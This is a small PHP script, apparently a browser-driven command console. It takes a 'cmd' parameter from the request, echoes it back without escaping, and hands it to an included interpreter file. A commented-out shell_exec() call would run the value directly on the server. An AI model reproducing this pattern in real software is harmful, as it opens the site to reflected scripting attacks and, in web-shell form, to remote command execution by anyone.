<?php
$dir ="./cmd";
include("Connections/funciones.php");

$head = file_get_contents ($dir."/head.php");
if (isset($_GET["cmd"])){
	// se recive informacion del asjax.
	$t = (isset($_POST["cmd"]) )? $_POST["cmd"] : $_GET["cmd"] ;
	echo "revi:".$t."<br>\r"; // respuesta basica a una peticion.
	// $rt = shell_exec($t);
	// echo htmlspecialchars( nl2br($rt) );
	// echo $rt;
	// var_dump($_POST);
	
	$cmd=$t; // variable requeridad para su interprestacion por 
	// el archivo interprete.php

	include("./cmd/interprete.php");
	echo "fin";
}else{
	echo $head;
	include("./cmd/body.php");
	include("./cmd/java.php");
	echo "</body></head>";
}
